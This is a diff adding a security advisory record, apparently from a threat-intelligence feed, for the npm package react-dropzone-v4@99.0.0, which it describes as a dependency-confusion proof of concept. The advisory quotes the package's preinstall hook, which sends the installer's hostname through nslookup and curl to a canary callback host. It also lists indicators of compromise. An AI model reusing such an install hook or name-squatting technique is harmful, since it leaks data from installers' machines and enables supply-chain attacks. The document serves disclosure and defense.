@@ -1,0 +1,55 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-13357",
+  "aliases": [
+    "MAL-2026-17758"
+  ],
+  "modified": "2026-10-26T01:35:38Z",
+  "published": "2026-10-26T01:35:25Z",
+  "summary": "Security-research / proof-of-concept package: react-dropzone-v4 (npm)",
+  "details": "This package is a dependency-confusion proof of concept. Its only file is a package.json whose preinstall lifecycle hook resolves and then requests a canary callback host with the installer's hostname embedded in the name: `nslookup $(hostname).hzbvy3cmgred066nig6n3ux0y[.]canarytokens[.]com`, falling back to `curl hxxp://hzbvy3cmgred066nig6n3ux0y[.]canarytokens[.]com/$(hostname)`. The package name and version (react-dropzone-v4@99.0.0) imitate the real react-dropzone package at an implausible major version, and the manifest describes itself as security research. The beacon transmits only the machine hostname — no environment variables, tokens, credential files, wallet data or file contents are read or sent, and there is no second-stage download or executed code beyond the hook itself. Installing the package does execute the hook, so the callback fires on install.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "react-dropzone-v4",
+        "purl": "pkg:npm/react-dropzone-v4"
+      },
+      "versions": [
+        "99.0.0"
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/react-dropzone-v4/v/99.0.0"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "research_poc",
+      "first_seen_at": "2026-10-26T01:35:25Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "hzbvy3cmgred066nig6n3ux0y[.]canarytokens[.]com"
+        ],
+        "sha256": [
+          "1019db8d50cbc0cd5b5fcc2c587fe6dd25284368b360bea725b3dc629aacef4f"
+        ],
+        "url_observed": [
+          "hxxp://hzbvy3cmgred066nig6n3ux0y[.]canarytokens[.]com/"
+        ]
+      }
+    }
+  }
+}
